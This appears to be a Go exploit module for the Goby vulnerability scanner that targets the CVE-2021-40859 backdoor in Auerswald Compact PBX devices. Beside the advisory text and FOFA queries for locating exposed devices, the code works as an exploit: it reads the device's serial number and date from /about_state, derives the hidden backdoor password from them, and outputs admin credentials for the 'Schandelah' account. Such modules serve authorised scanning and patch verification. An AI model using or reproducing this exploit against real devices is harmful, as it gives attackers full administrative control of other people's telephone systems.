package exploits

import (
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Compact backdoors (CVE-2021-40859)",
    "Description": "<p>Auerswald Compact series is an Ict solution from Auerswald, Germany.</p><p>Auerswald Compact series devices have backdoor vulnerabilities. These backdoors allow an attacker to have full administrative access to the device.</p>",
    "Impact": "Compact backdoors (CVE-2021-40859)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.auerswald.de/en/product/compact-5500r\">https://www.auerswald.de/en/product/compact-5500r</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the system version.</p>",
    "Product": "Compact",
    "VulType": [
        "Other"
    ],
    "Tags": [
        "Other"
    ],
    "Translation": {
        "CN": {
            "Name": "Compact 系列设备存在后门漏洞（CVE-2021-40859）",
            "Description": "<p>Auerswald Compact 系列是德国Auerswald公司的一种 Ict 解决方案。</p><p>Auerswald Compact 系列存在后门漏洞，这些后门允许能够访问基于 Web 的管理应用程序的攻击者对设备进行完全管理访问。</p>",
            "Impact": "<p>Auerswald Compact 系列存在后门漏洞，这些后门允许能够访问基于 Web 的管理应用程序的攻击者对设备进行完全管理访问。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://www.auerswald.de/en/product/compact-5500r\">https://www.auerswald.de/en/product/compact-5500r</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、升级系统版本。</p>",
            "Product": "Compact",
            "VulType": [
                "其它"
            ],
            "Tags": [
                "其它"
            ]
        },
        "EN": {
            "Name": "Compact backdoors (CVE-2021-40859)",
            "Description": "<p>Auerswald Compact series is an Ict solution from Auerswald, Germany.</p><p>Auerswald Compact series devices have backdoor vulnerabilities. These backdoors allow an attacker to have full administrative access to the device.</p>",
            "Impact": "Compact backdoors (CVE-2021-40859)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.auerswald.de/en/product/compact-5500r\">https://www.auerswald.de/en/product/compact-5500r</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the system version.</p>",
            "Product": "Compact",
            "VulType": [
                "Other"
            ],
            "Tags": [
                "Other"
            ]
        }
    },
    "FofaQuery": "body=\"auerswald\" || title=\"auerswald\"",
    "GobyQuery": "body=\"auerswald\" || title=\"auerswald\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://apache.org/",
    "DisclosureDate": "2021-12-26",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-40859"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-40859"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202112-390"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [
            "Compact"
        ],
        "System": [],
        "Hardware": []
    },
    "PocId": "10247"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := `/about_state`
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "pbx") && strings.Contains(resp.RawBody, "dongleStatus\":0") && strings.Contains(resp.RawBody, "macaddr")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := `/about_state`
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 {
				serialFind := regexp.MustCompile("\"serial\":\"(.*?)\",").FindStringSubmatch(resp.RawBody)
				dateFind := regexp.MustCompile("\"date\":\"(.*?)\",").FindStringSubmatch(resp.RawBody)
				passfind := fmt.Sprintf("%x", md5.Sum([]byte(serialFind[1]+"r2d2"+dateFind[1])))
				expResult.Output = "user: Schandelah\npass: " + passfind[0:7]
				expResult.Success = true
			}
			return expResult
		},
	))
}
